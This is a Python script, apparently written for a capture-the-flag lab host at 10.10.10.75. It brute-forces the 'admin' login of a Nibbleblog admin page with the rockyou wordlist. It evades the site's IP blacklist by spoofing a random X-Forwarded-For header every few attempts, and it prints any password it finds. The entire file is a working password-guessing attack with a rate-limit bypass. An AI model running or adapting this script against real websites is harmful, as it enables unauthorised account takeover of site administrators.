from random import randint

import requests

# Brute force information
#PASSWORD_LIST = '/usr/share/wordlists/rockyou.txt'
PASSWORD_LIST = './rockyou.txt'
RATE_LIMIT = 5
RATE_LIMIT_ERROR = 'Blacklist protection'
LOGIN_FAILED_ERROR = 'Incorrect username or password.'
SUCCESS_LOGIN = 'New session started'

# Target information
RHOST = '10.10.10.75'
LOGIN_PAGE = '/nibbleblog/admin.php'
TARGET_URL = f'http://{RHOST}{LOGIN_PAGE}'
USERNAME = 'admin'


def attempt_login(password: str, ip: str) -> bool:
    headers = {'X-Forwarded-For': ip}
    payload = {'username': USERNAME, 'pasword': password}
    r = requests.post(TARGET_URL, headers=headers, data=payload)

    if r.status_code == 500:
        print("Internal server error, aborting!")
        exit(1)

    if RATE_LIMIT_ERROR in r.text:
        print("Rate limit hit, aborting!")
        exit(1)
    
    if SUCCESS_LOGIN in r.text:
        print("yes it is there")

    if LOGIN_FAILED_ERROR in r.text:
       return False 
    elif SUCCESS_LOGIN in r.text:
       return True
    else:
       return False
   # return LOGIN_FAILED_ERROR not in r.text

def random_ip() -> str:
    return ".".join(str(randint(0,255)) for _ in range(4))

def run(start_at: int=1):
    ip: str = random_ip()
    num_attempts: int = 1

    for password in open(PASSWORD_LIST):
        if num_attempts < start_at:
            num_attempts += 1
            continue

        if num_attempts % (RATE_LIMIT -1) == 0:
            ip = random_ip()

        password = password.strip()
        print(f"Attempt {num_attempts}: {ip}\t\t{password}")
        
        if attempt_login(password, ip):
            print(f"Password for {USERNAME} is {password}")
            break
        else:
            print("blah blah")

        num_attempts += 1



if __name__ == '__main__':
    run()
